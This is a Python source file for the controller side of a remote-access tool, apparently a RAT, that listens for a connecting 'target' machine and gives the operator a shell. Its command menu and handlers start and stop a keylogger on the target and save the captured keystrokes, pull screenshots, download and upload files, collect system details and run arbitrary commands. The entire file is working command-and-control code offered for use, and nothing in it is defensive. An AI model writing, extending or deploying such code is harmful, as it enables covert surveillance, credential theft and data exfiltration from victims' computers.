#!/usr/bin/python

# Remote Shell - ( Linux systems )

# Description:
# This script establishes a remote shell connection with a target machine, allowing the execution
# of various commands and file operations.

# [</>] Problems:
# • Problem 1: KeyboardInterrupt doesn't work on Windows.
# ~ Workaround: To avoid this issue, it's recommended to run the
# server on a Linux system where KeyboardInterrupt works as expected.

# • Problem 2: Some system commands may not provide a response, causing the shell to appear unresponsive.
# ~ Workaround: If you encounter this issue, use KeyboardInterrupt (Ctrl+C) to exit the current command
# and then press Enter to stay in the shell and run another command.


# Standard library imports
import socket
import os
import time
from datetime import datetime

# Import Special libraries
import json


class Server:
    def __init__(self):
        # .....................................  [ Initialize class attributes ]
        self.l_host = '192.168.0.0'  # ... Local host
        self.l_port = 5555  # ............ Local port
        self.r_host = None  # ............ Remote host (to be set later)
        self.base_filename = None  # ..... Base filename for logs and screenshots
        self.log_filename = None  # ...... Log filename
        self.screenshot_filename = None  # Screenshot filename
        self.dump_logging = ""  # ........ Initialize log data
        self.server_socket = None  # ..... Server socket
        self.target_socket = None  # ..... Target socket
        self.active_once = True  # ....... Initialize active_once flag

    def main(self):
        """
        Main function to handle the remote shell.
        """
        # Set base filenames for logs and screenshots using the current date and time.
        self.base_filename = datetime.now().strftime("%d-%m-%Y_%H-%M")
        self.log_filename = f'{self.base_filename}.txt'
        self.screenshot_filename = f'{self.base_filename}.png'

        # Create a server socket with IPv4 on TCP protocol and wait for incoming target connection.
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.l_host, self.l_port))
        print("[•] Listening for incoming connections")
        self.server_socket.listen(5)

        # Accept a connection from the target and print the connection information.
        self.target_socket, self.r_host = self.server_socket.accept()
        print("[+] connected to: " + str(self.r_host))

        print("\n[*] Type: info\n")

        # Enter shell
        while True:
            try:
                command = input("[$] shell~# ")
                if command == '':
                    continue

                elif command.lower() == 'info':
                    print("""

                        [*] Shell commands:


                        • keyscan start - Start the keylogger.

                        • keyscan stop - Stop the keylogger and save the log to a file in the script's directory.

                        • screenshot - Take a screenshot and save the img in the script's directory.

                        • download <file_name> - Download a file from the target.

                        • upload <file_name> - Upload a file to the target.

                        • sys info - Get target info (IP + Port, Platform, System, Architecture).

                        • clear or cls - Clear the screen.


                        • quit - Quit the shell and close the connection.


                        Note: Replace <file_name> with the name of the file you want to download or upload.

                        """)
                    continue

                elif command.startswith('keyscan stop'):  # just to be safe
                    continue

                self.send_data_as_json(command)

                if command.lower() == 'quit':
                    self.dump_log_file()
                    self.target_socket.close()
                    exit(0)

                elif command.startswith('cd '):
                    continue

                elif command in ['clear', 'cls']:
                    clear_command = 'clear' if command == 'clear' else 'cls'
                    os.system(clear_command)
                    continue

                elif command.startswith('keyscan start'):
                    print("[+] Keylogger started.")
                    print("[!] ctrl+C to save & stop")
                    self.key_logger()
                    print("[!] Log saved! ")
                    time.sleep(1.25)
                    self.send_data_as_json('keyscan stop')
                    continue

                elif command.startswith('download'):
                    self.download_file(command[9:])
                    continue

                elif command.startswith('upload'):
                    self.upload_file(command[7:])
                    continue

                elif command.startswith('screenshot'):
                    self.screen_shot()
                    continue

                elif command.startswith('sys info'):
                    self.target_sys_info()
                    continue

                else:
                    # If the command is not recognized as a shell command,
                    # send it to the target system and wait for a response.
                    result = self.receive_data_as_json()
                    print(result)

            except KeyboardInterrupt:
                # Handle KeyboardInterrupt: Provide the user with two options - leave the program or stay.
                print("[ WARNING ] #~ KeyboardInterrupt ~# [ WARNING ]\n"
                      "</> Press [ Enter ] to stay.\n"
                      "</> Type [ Yes ] to Exit.\n")

                KeyboardInterrupt_loop = input("[ Exit? ]--> ")
                if KeyboardInterrupt_loop.lower() == 'yes':
                    break
                else:
                    continue

    def dump_log_file(self):
        """
           Step 1: Check if a log file already exists. If it does, add a number to the filename.
           Step 2: Create a log file and append the keylog string to it.
        """
        count = 1
        while os.path.exists(self.log_filename):
            count += 1
            self.log_filename = f'{self.base_filename} ({count}).txt'

        with open(self.log_filename, "a") as log:
            log.write(self.dump_logging)

    def key_logger(self):
        """
        • Initialize a log string.
        • continuously receive key logs from the target, and append received keys to the log string.
        • Use "KeyboardInterrupt" to stop receiving key logs and deactivate the keylogger on the target machine.
        """
        self.dump_logging = ""  # Initialize log string
        while True:
            try:
                R_OUTPUT = self.target_socket.recv(1024).decode()
                print(R_OUTPUT, end='')
                self.dump_logging += R_OUTPUT  # Append received keys to the log
            except KeyboardInterrupt:
                self.dump_log_file()  # Save the log to a fil
                break

    def send_data_as_json(self, data):
        """
        Convert data to JSON format and send it to the target system.

        Args:
            data (str): The data to be serialized and sent as JSON.
        """
        json_data = json.dumps(data)
        self.target_socket.send(json_data.encode())

    def receive_data_as_json(self):
        """
         Receive data as JSON from the target system.

         Returns:
             dict: The received data parsed from JSON.
         """
        received_data = ''
        while True:
            try:
                received_data += self.target_socket.recv(1024).decode().rstrip()
                return json.loads(received_data)
            except json.JSONDecodeError:
                continue

    def upload_file(self, file_name):
        """
        Upload a file to the target system.

        Args:
            file_name (str): The name of the file to be uploaded.

        """
        try:
            with open(file_name, 'rb') as up_file:
                self.target_socket.send(up_file.read())

        except Exception as e_upload_file:
            print(f"Error uploading file: {e_upload_file}")

    def download_file(self, file_name):
        """
        Download a file from the target system.

        Args:
            file_name (str): The name of the file to be downloaded.
        """
        try:
            with open(file_name, 'wb') as down_file:
                # Set a timeout to prevent Hanging indefinitely while waiting for data
                self.target_socket.settimeout(1)
                while True:
                    chunk = self.target_socket.recv(1024)
                    if not chunk:
                        break
                    down_file.write(chunk)

        except socket.timeout:
            pass

        except Exception as e_download_file:
            print(f"Error downloading file: {e_download_file}")

        finally:
            # Reset the socket's timeout to its default state (no timeout)
            self.target_socket.settimeout(None)

    def screen_shot(self):
        """
        Capture a screenshot from the target system and save it as a .png file.

        Steps:
        1. Check if a file with the base name already exists. If it does, add a number to the filename.
        2. Create a .png file and receive image chunks from the target, writing them to the file.
        3. Wait to receive the "END_OF_IMAGE" code to stop the loop and finalize the screenshot.

        Returns:
            None
        """
        # Check if the file with the base name already exists
        count = 1
        while os.path.exists(self.screenshot_filename):
            # If it exists, increment the count and update the filename
            count += 1
            self.screenshot_filename = f'{self.base_filename} ({count}).png'

        try:
            with open(self.screenshot_filename, 'ab') as screen_shot:
                while True:
                    # Receive the image chunk
                    image_chunk = self.target_socket.recv(1024)

                    # Check if the received chunk is the last part of the image
                    if b"END_OF_IMAGE" in image_chunk:
                        screen_shot.write(image_chunk[:-len(b"END_OF_IMAGE")])
                        break
                    else:
                        screen_shot.write(image_chunk)

        except Exception as e_screenshot:
            print(f"Screenshot error: {e_screenshot}")

    def target_sys_info(self):
        """
        Retrieve and display information about the target system.
        """
        print(f"\n[+] Target information")
        print(f"IP: {self.r_host}", end='')
        target_sys = self.receive_data_as_json()
        print(target_sys, "\n")


if __name__ == "__main__":
    server = Server()  # enter ip and port
    server.main()
